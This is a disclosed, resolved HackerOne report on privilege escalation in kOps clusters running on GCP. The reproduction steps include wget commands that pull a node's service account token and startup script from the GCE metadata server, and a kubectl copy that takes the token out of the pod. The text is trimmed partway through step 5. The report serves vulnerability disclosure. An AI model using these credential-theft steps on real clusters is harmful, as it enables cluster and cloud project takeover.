# [H] Privilege Escalation in kOps using GCE/GCP Provider

## Summary
Severity: High (CVSS 8.0)
Program: Kubernetes
Weakness: Privilege Escalation
Reporter: jpts
State: resolved
Disclosed: 2023-08-04T19:24:50.539Z
Source: https://hackerone.com/reports/1842829

## Details
## Summary:
When using kOps with the GCP provider, it is possible for a user with shell access to any pod, to escalate their privileges to cluster admin. During provisioning of the cluster, kOps gives all nodes access to the state storage bucket through the service account associated with the instance. Any user with shell access can request the service account credentials, and read sensitive information from the state store. Using this information, the user can privesc to cluster admin, compromising the entire cluster. It is further possible to compromise a privileged GCP service account associated with the control-plane nodes and takeover other resources in the GCP project.

## Kubernetes Version:
Kubernetes: v1.25.5

## Component Version:
kOps: v1.25.3

## Steps To Reproduce:
### Cluster Setup:

The test cluster was setup as close to the [getting started](https://kops.sigs.k8s.io/getting_started/gce/) guide as possible.
```bash
export KOPS_STATE_STORE=gs://kops-state-test/
export PROJECT=`gcloud config get-value project`

gsutil mb $KOPS_STATE_STORE
kops create cluster kops.k8s.local --zones europe-west1-b --state ${KOPS_STATE_STORE} --project=$PROJECT --master-size=n1-standard-2 --node-size=n1-standard-2
kops update cluster --name kops.k8s.local --yes --admin
kops validate cluster --wait 10m
```
### Privesc
  1. Add a demo container in which user is allow shell access (manifest attached):
  `k apply -f shell.yaml`
  2. Give ourselves a shell:
  `k exec -it shell-5d64dd647c-8l8s6 -it -- ash`
  3. Grab the service account token and state bucket name
  ```
  pod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -O default.token
  pod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script -O- | grep ConfigBase
  ```
  4. Copy file back to the host
  ```
  k cp shell-5d64dd647c-8l8s6:/default.token default.token
  ```
  5.  Ensure normal gcloud auth not in use and set token environment var
  ```
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/1842829_
